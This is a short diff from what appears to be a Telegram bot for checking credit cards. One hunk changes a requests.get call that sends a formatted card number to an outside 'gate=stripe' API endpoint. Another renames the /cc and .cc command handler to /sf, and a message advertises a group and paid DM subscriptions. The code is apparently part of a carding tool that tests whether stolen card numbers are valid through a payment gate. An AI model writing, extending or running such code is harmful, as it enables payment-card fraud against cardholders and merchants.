@@ -518,7 +518,7 @@ def check_new_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://api-sp-storm.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
+                f"https://api-sp-storm.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
@@ -9429,9 +9429,9 @@ def check_sf_cc(cc):
         }
 
 # Handle both /cc and .cc
-@bot.message_handler(commands=['cc'])
-@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
-def handle_cc(message):
+@bot.message_handler(commands=['sf'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sf'))
+def handle_sf(message):
     # Check if user is allowed to use in DMs
     if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
         bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
